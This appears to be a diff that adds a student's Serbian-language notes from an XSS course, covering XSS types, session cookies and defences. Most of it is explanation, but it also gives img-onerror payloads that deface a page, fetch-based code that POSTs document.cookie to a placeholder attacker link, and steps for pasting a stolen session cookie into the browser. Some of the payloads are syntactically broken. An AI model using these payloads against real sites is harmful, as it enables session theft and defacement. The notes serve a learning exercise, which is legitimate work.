@@ -1,0 +1,196 @@
+XSS je napad na pretrazivac korisnika, a NE na Server.
+
+
+XSS napade mozemo podeliti na osnovu toga odakle zlonamerni kod dolazi:
+    
+    1. Uskladisteni XSS(perzistentni)    // Komentar koji unosi preko forme
+
+    2. Reflektovani XSS
+        + Server side
+        + Client side    [DOM based]
+
+
+
+Posledice:
+
+    1. Poverljivost
+        Slanje podaka sa stranice napadacu(POST zahtev na napadacev server)
+
+    2. Integritet
+        Izmena podataka na stranici sa skorisnikovim privilegijama
+
+    3. Autentifikacija i autorizacija
+        + Kradja sesije(slanje cookie napadacu)
+        + Esksalacija privilegija(zdministrator, direktor firme, drzavni zvan.)
+
+    4. Reputacija
+        + Ubacivanje neprikladnih sadrzaja na web sajt("website defacement")
+
+
+
+#####################
+### Server sesija ###
+#####################
+
+    Server sesija korisnika se uspostavlja posle autentifikacije(logina) --
+    zavrsva se nakon logout-a ili definsanog isteka
+
+    Oznacava da je korisnikova autentifikacija trneutno vazeca
+
+    Pored toga omogucava skladistenje nekih dodatnih podatka u toku
+    sesije(kesiranje)
+
+
+    Sesija se obicno identifikuje pomocu cookie-ja. Cookie se salje sa svakim
+    HTTP zahtevom.
+
+    Connection: keep-alive
+    Cookie: JSESSIONID=0E89D83BDAE8DD903D42FA65FB9EFC68
+    Host: localhost:8080
+
+
+    Oni mogu da se koriste da prate ono sto mi pretrazujemo, recimo, na nekom
+    web server-u. Takvi cookie-i se koriste da bi taj web server mogao da nam
+    sto bolje reklamira neke svoje proizvode.
+
+    Postoji vise VRSTA Cookie-a koji mogu da se nadju na nasem PRETRAZIVACU.
+
+
+
+    Ako je tvoja sesija OTVORENA, ti mozes da udjes na svoj nalog BEZ da
+    ukucavas opet korisnicko ime i lozinku.
+
+    Npr. udjes na Fejsbuk, ulogujes se i onda kada u novom Tab-u ukucas:
+    facebook.com, tvoj pretrazivac ce da posalje paket ka facebook-u sa
+    Cookie-em tvoje TRENUTNE I AKTIVNE sesije(koji stoji u tvom pretrazivacu) i
+    ti ces videti svoju pocetnu stranicu. Ne moras da se logujes ponovo.
+
+
+    Kadagod postoji ime za unos, a mi imamo sesiju -- Napadac moze da vas
+    navede na ovako nesto.
+
+
+
+#############
+### Napad ###
+#############
+    
+    // Ovo ce da bude SPRECENO od strane PRETRAZIVACA jer pocinje sa <script>
+    <script>alert("Napao sam te!")</script>
+
+
+    // Ali ovaj napad ce PROCI:
+    <img src='x' onerror="alert('Napao sam te!')"/>
+
+
+    <img src='x' onerror="alert('Your cookie: ' + document.cookie + ')">
+
+    // Mogli smo ovde i da dodamo jos kod u kome taj cookie biva poslat na neki
+    // napadacev(nas) server
+
+
+    // Kada ukrademo Cookie, odemo na:
+
+        Pretrazivac > Inspect > Application > JSESSIONID > paste-ujemo_Cookie
+
+
+    // "document" je INTERFEJS vase stranice. Preko njega mozemo da dohvatamo
+    // razlicite HTML elemente sa nase stranice(Bilo vidljive bilo nevidljive)
+
+
+
+    // Ako pise "Blocked by Client", to znaci da nije uopste dozvoljeno
+    // izvrsavanje Javascript-a od strane pretrazivaca(to je ono sto Stallman
+    // zagovara)
+
+
+
+    Vecina ovih zlonamernih link-ova dolazi preko mejla. Jedan od
+    najzastupljenijih Mail-Client-anata je "Microsoft Outlook".
+
+    Da li pretpostavljate koji default browser moze da bude u tom Outlook-u?
+    (Internet Explorer cesto)
+
+
+
+    Plugin-ovi su problem. U slucaju da ih koristimo kao korisnici, tada ni
+    izbor browser-a ne moze da nam pomogne, ako smo instalirali neki zlonamerni
+    plugin.
+
+    Ili Plugin koji u sebi ima exploit.
+
+
+
+
+
+    // Menjanje komentara
+
+    // Pretrazivac > Inspect > Elements > <h2 id='car-comments'>Car commnets</h2> == $0
+
+    <img src='x' onerror="document.getElementById('car-comments').textContent = 'No comments allowed!'" />
+
+
+
+#############################
+### Zastita od XSS napada ###
+#############################
+    
+    1. Dozvoliti samo sigurne karaktere kao unos korisnika("whitelist")
+
+    2. "Sanitizacija" kroz izbacivanje ili zamenu nesigurnih
+       karaktera("blacklist")
+
+        (izuzetno je tesko napraviti Sanitizer, zato koristi postojece:)
+          + JAVA: HtmlUtils.htmlEscape
+          + .NET: System.Web.Security.AntiXss.AntiXssEncoder
+
+    3. Koriscenje sigurnih outputting alata iz framework-a
+
+
+
+###########################
+### Popravka Ranjivosti ###
+###########################
+1:05:00 // Pogledaj ponovo kako se popravlja, nisam razumeo
+1:24:00 // Resenje jednog lika
+
+
+// Ovo je radilo kod Danka
+<script>
+fetch('<link>', {method: 'POST', body: JSON.stringify(document.cookie),
+headers: {'Content-Type:' : 'application/json'}})
+</script>
+
+
+
+// Resenje koleginice
+
+<img src='x' onerror="const element =
+document.getElementById('carSearchErrorMessage'): const requestOptions =
+(method: 'POST', headers: {'Content-Type: 'application/json'}, body:
+JSON.stringify(document.cookie)): fetch("<link>", requestOptions).then(response
+=> response.json()).then(data => element.innerHTML = data.id); />
+
+
+#############
+### fetch ###
+#############
+
+// 1:33:00
+Ovo je funkcija koja se koristi gdegod se koristi Javascript i onda se koristi
+za slanje HTTP/S zahteva.
+
+// Najbolji sajt za objasnjenje:
+
+developer.mozilla.org/en-US/docs/Web/API/Fetch_API
+
+
+// Pritisni F12, to je "Developer Tools" i on je zgodan kad ucimo ove napade.
+
+Network Tab prikazuje sve(ne samo Fetch/XHR) pozive, nego sve ono sto se desava
+u prometu izmedju servera i naseg browser-a.
+
+
+Probaj u Console-i da napises neku svoju skripticu, tako mozes da probas da
+dohvatas razne HTML elemente na stranici i time uvezbavas sta treba da se
+"gadja".
